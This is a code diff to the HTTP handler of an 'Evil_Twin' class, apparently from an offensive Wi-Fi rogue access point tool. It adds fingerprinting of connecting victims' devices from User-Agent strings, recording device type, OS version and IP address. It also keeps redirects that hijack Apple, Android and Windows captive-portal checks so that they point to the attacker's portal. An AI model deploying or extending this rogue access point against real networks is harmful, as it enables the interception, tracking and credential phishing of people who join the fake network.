@@ -2500,20 +2500,58 @@ class Evil_Twin():
         def do_GET(self):
             """This will handle http requests that are made"""
 
-            # Captive portal detection URLs - redirect to portal
+            # Get device info
+            user_agent = self.headers.get('User-Agent', 'Unknown')
+            ip_address = self.client_address[0]
+            language = self.headers.get('Accept-Language', 'Unknown')
+
+            # Parse device details from User-Agent
+            if 'iPhone' in user_agent or 'iPad' in user_agent:
+                device_type = 'Apple'
+                # Extract iOS version if present (e.g., "iPhone OS 17_1")
+                if 'iPhone OS' in user_agent:
+                    ios_ver = user_agent.split('iPhone OS ')[1].split(' ')[0].replace('_', '.')
+                    device_info = f"iOS {ios_ver}"
+                else:
+                    device_info = "iOS"
+            elif 'Mac' in user_agent:
+                device_type = 'Apple'
+                device_info = "macOS"
+            elif 'Android' in user_agent:
+                device_type = 'Android'
+                # Extract Android version (e.g., "Android 14")
+                if 'Android ' in user_agent:
+                    android_ver = user_agent.split('Android ')[1].split(';')[0]
+                    device_info = f"Android {android_ver}"
+                else:
+                    device_info = "Android"
+            elif 'Windows' in user_agent:
+                device_type = 'Windows'
+                device_info = "Windows"
+            elif 'Linux' in user_agent:
+                device_type = 'Linux'
+                device_info = "Linux"
+            else:
+                device_type = 'Unknown'
+                device_info = "Unknown"
+
+            # Captive portal detection - log device info
             if self.path in ['/hotspot-detect.html', '/library/test/success.html']:
+                console.print(f"[bold cyan][+] {device_type} device connected | IP: {ip_address} | {device_info}")
                 self.send_response(302)
                 self.send_header('Location', f'http://{self.headers.get("Host", "10.0.0.1")}/')
                 self.end_headers()
                 return
 
             if self.path in ['/generate_204', '/gen_204']:
+                console.print(f"[bold cyan][+] {device_type} device connected | IP: {ip_address} | {device_info}")
                 self.send_response(302)
                 self.send_header('Location', f'http://{self.headers.get("Host", "10.0.0.1")}/')
                 self.end_headers()
                 return
 
             if self.path in ['/ncsi.txt', '/connecttest.txt']:
+                console.print(f"[bold cyan][+] {device_type} device connected | IP: {ip_address} | {device_info}")
                 self.send_response(302)
                 self.send_header('Location', f'http://{self.headers.get("Host", "10.0.0.1")}/')
                 self.end_headers()
